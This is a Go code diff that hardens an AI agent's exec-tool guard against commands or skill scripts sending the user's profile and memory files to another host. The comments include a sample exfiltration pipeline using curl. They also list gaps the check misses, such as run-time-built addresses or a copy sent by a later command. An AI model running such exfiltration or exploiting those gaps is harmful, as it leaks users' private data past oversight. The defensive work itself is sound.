@@ -25,9 +25,11 @@ var networkClientPattern = regexp.MustCompile(
 var personalFilePattern = regexp.MustCompile(
 	`(?i)(?:^|[\s'"=@/\\(,:])(?:(?:user|soul|memory)\.md\b|(?:memory|sessions)[/\\])`)
 
-// downloadTargetPattern finds where a command writes what it downloads: a
-// personal file there is written, not sent.
-var downloadTargetPattern = regexp.MustCompile(`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+`)
+// writtenFilePattern finds where a command writes what it fetches: a personal
+// file there is written, not sent. `tee` counts only as a pipeline stage, with
+// every file it names; anywhere else the word is just an argument.
+var writtenFilePattern = regexp.MustCompile(
+	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+|\|\s*tee\b[^|]*`)
 
 // scriptPathPattern finds the script files a command hands to an interpreter.
 var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)
@@ -37,42 +39,157 @@ const (
 	maxScannedScriptBytes = 64 << 10
 )
 
-// personalFilesSentTo returns where a command, or a script it runs, would
-// hand the person's profile or memory files, or "". A skill or a file that
-// asks for it is not the person asking, and some models follow a skill step
-// by step.
-// shortcut: it reads the command and the scripts it names, so code that builds the path or the address
-// at run time, or a script reached after a cd, passes; upgrade to a network policy for skill scripts then.
+// personalFilesSentTo returns where a command would hand the person's profile
+// or memory files, or "". A skill or a file that asks for it is not the person
+// asking, and some models follow a skill step by step. A file counts as sent
+// only when the same command, or the skill script it runs, reaches another
+// host and does not merely write the file.
+// shortcut: it reads each command on its own and only the scripts of skills, so code that builds the
+// address or the path at run time, a script reached after a cd, or a copy sent by a later command passes;
+// upgrade to a network policy for skill scripts then.
 func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
-	text := command + t.scriptsRun(command, cwd)
-	destination := ""
-	if raw := remoteURLPattern.FindString(text); raw != "" {
-		destination = raw
-		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
-			destination = parsed.Hostname()
+	for _, unit := range commandUnits(command) {
+		text := unit + t.skillScriptsRun(unit, cwd)
+		destination := remoteDestination(text)
+		sent := writtenFilePattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
+		if destination != "" && personalFilePattern.MatchString(sent) {
+			return destination
 		}
-	} else if networkClientPattern.MatchString(text) {
-		destination = "another host"
 	}
-	sent := downloadTargetPattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
-	if destination == "" || !personalFilePattern.MatchString(sent) {
-		return ""
-	}
-	return destination
+	return ""
 }
 
-// scriptsRun is the text of the regular files a command names as scripts, so
-// a script that names the files and the address itself is read like the
-// command. Under a workspace restriction it reads only scripts inside it: the
-// refusal names a host, and one from a file the agent cannot read must not leak.
-func (t *ExecTool) scriptsRun(command, cwd string) string {
+func remoteDestination(text string) string {
+	if raw := remoteURLPattern.FindString(text); raw != "" {
+		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
+			return parsed.Hostname()
+		}
+		return raw
+	}
+	if networkClientPattern.MatchString(text) {
+		return "another host"
+	}
+	return ""
+}
+
+// commandUnits splits a command where one command ends and the next begins:
+// an unquoted `;`, `&&` or `||`, or a new line the shell does not continue with
+// a backslash. A pipeline stays whole, since `cat USER.md | curl -d @- host`
+// sends what the first stage reads; so does a new line inside quotes, and a
+// heredoc body, which is the input of the command that opens it.
+func commandUnits(command string) []string {
+	var units []string
+	var unit strings.Builder
+	runes := []rune(lineContinuation.Replace(command))
+	quote := rune(0)
+	var heredocs []heredoc
+	cut := func() {
+		units = append(units, unit.String())
+		unit.Reset()
+	}
+	for i := 0; i < len(runes); i++ {
+		r := runes[i]
+		switch {
+		case quote != 0:
+			if r == quote {
+				quote = 0
+			}
+		case r == '\'' || r == '"':
+			quote = r
+		case r == '<' && i+2 < len(runes) && runes[i+1] == '<' && runes[i+2] != '<':
+			if doc, ok := readHeredoc(runes[i+2:]); ok {
+				heredocs = append(heredocs, doc)
+			}
+		case r == '\n':
+			unit.WriteRune(r)
+			for _, doc := range heredocs {
+				i = doc.appendBody(runes, i+1, &unit) - 1
+			}
+			heredocs = nil
+			cut()
+			continue
+		case r == ';':
+			cut()
+			continue
+		case (r == '&' || r == '|') && i+1 < len(runes) && runes[i+1] == r:
+			cut()
+			i++
+			continue
+		}
+		unit.WriteRune(r)
+	}
+	cut()
+	return units
+}
+
+// heredoc is a `<<WORD` or `<<-WORD` the command opened.
+type heredoc struct {
+	delimiter string
+	stripTabs bool
+}
+
+// readHeredoc reads the delimiter that follows `<<`, quoted or bare.
+func readHeredoc(rest []rune) (heredoc, bool) {
+	doc := heredoc{}
+	i := 0
+	if i < len(rest) && rest[i] == '-' {
+		doc.stripTabs = true
+		i++
+	}
+	for i < len(rest) && (rest[i] == ' ' || rest[i] == '\t') {
+		i++
+	}
+	var word strings.Builder
+	for ; i < len(rest) && !strings.ContainsRune(" \t\n;&|<>()", rest[i]); i++ {
+		if rest[i] != '\'' && rest[i] != '"' && rest[i] != '\\' {
+			word.WriteRune(rest[i])
+		}
+	}
+	doc.delimiter = word.String()
+	return doc, doc.delimiter != ""
+}
+
+// appendBody writes the heredoc's lines, from start through the delimiter
+// line, to unit as they are (no quotes are tracked in data), and returns where
+// the next line begins. A body that never closes runs to the end.
+func (doc heredoc) appendBody(runes []rune, start int, unit *strings.Builder) int {
+	for start < len(runes) {
+		end := start
+		for end < len(runes) && runes[end] != '\n' {
+			end++
+		}
+		line := string(runes[start:end])
+		unit.WriteString(line)
+		unit.WriteByte('\n')
+		start = end + 1
+		if doc.stripTabs {
+			line = strings.TrimLeft(line, "\t")
+		}
+		if line == doc.delimiter {
+			break
+		}
+	}
+	return start
+}
+
+// lineContinuation joins what the shell runs as one line.
+var lineContinuation = strings.NewReplacer("\\\r\n", " ", "\\\n", " ")
+
+// skillScriptsRun is the text of the skill scripts a command runs, so a skill
+// script that names the files and the address itself is read like the command.
+// Only skills come from someone else: the assistant's own scripts, a cron job
+// that saves fetched data to memory among them, are not read.
+func (t *ExecTool) skillScriptsRun(command, cwd string) string {
+	if t.workingDir == "" {
+		return ""
+	}
 	var text strings.Builder
 	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
 		path := name
 		if !filepath.IsAbs(path) {
 			path = filepath.Join(cwd, path)
 		}
-		if t.restrictToWorkspace && t.workingDir != "" && !insideWorkspace(path, t.workingDir) {
+		if !isSkillScript(path, t.workingDir) {
 			continue
 		}
 		if info, err := os.Stat(path); err != nil || !info.Mode().IsRegular() {
@@ -90,7 +207,11 @@ func (t *ExecTool) scriptsRun(command, cwd string) string {
 	return text.String()
 }
 
-func insideWorkspace(path, workspace string) bool {
+// isSkillScript says whether path, once its links are resolved, is inside the
+// workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
+// links out of the workspace is not read: the refusal names a host, and one
+// from a file the agent cannot read must not leak.
+func isSkillScript(path, workspace string) bool {
 	resolved, err := filepath.EvalSymlinks(path)
 	if err != nil {
 		return false
@@ -100,5 +221,9 @@ func insideWorkspace(path, workspace string) bool {
 		return false
 	}
 	rel, err := filepath.Rel(root, resolved)
-	return err == nil && filepath.IsLocal(rel)
+	if err != nil || !filepath.IsLocal(rel) {
+		return false
+	}
+	parts := strings.Split(filepath.ToSlash(rel), "/")
+	return len(parts) > 1 && parts[0] == "skills" || len(parts) > 3 && parts[0] == "loops" && parts[2] == "skills"
 }
